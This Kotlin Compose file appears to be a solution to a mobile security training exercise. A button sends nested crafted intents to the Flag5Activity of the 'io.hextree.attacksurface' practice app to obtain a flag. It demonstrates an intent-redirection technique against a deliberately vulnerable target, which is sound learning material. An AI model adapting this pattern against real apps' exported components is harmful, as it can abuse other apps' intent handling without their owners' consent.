package com.example.myapplication

import android.content.ComponentName
import android.content.Intent
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext

@Composable
fun SendIntentToGetFlag5(modifier: Modifier = Modifier) {
    val context = LocalContext.current
    Column (
        modifier = Modifier.fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ){
        Button(
            onClick = {

                val nextIntent = Intent().apply {
                    putExtra("reason", "back")
                }

                val innerIntent = Intent().apply {
                    putExtra("return", 42)
                    putExtra("nextIntent", nextIntent)
                }

                val outerIntent = Intent().apply {
                    component = ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag5Activity"
                    )

                    putExtra(
                        "android.intent.extra.INTENT",
                        innerIntent
                    )
                }

                context.startActivity(outerIntent)
            }
        ) {
            Text("Get Flag 5")
        }
    }
}